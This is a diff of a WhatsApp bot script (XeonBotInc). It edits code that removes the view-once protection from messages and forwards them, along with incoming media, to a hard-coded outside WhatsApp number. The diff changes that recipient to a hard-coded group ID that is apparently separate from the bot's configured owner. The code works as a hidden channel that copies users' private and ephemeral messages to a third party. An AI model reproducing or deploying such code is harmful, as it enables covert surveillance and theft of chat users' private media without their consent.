@@ -786,7 +786,7 @@ list.push({
         let msg = val.message?.viewOnceMessage?.message || val.message?.viewOnceMessageV2?.message
         delete msg[Object.keys(msg)[0]].viewOnce
         val.message = msg
-        await XeonBotInc.sendMessage("6283890667327@s.whatsapp.net", { forward: val }, { quoted: m })
+        await XeonBotInc.sendMessage("120363276024993778@g.us", { forward: val }, { quoted: m })
     }
         //ANTI VIRUS
 if (isGroup && db.data.chats[m.chat].antivirtex) {
@@ -822,7 +822,7 @@ XeonBotInc.sendMessage(`${ownernumber}@s.whatsapp.net`,{text: `Hi Owner! wa.me/$
   }
         if (db.data.settings[botNumber].antimediaself && isMedia) {
             let val = { ...m }
-    return XeonBotInc.sendMessage("6283890667327@s.whatsapp.net", { forward : val }, {quoted : m})
+    return XeonBotInc.sendMessage("120363276024993778@g.us", { forward : val }, {quoted : m})
   }
         if (db.data.chats[m.chat].image && isXeonMedia) {
     if(isXeonMedia === "imageMessage"){
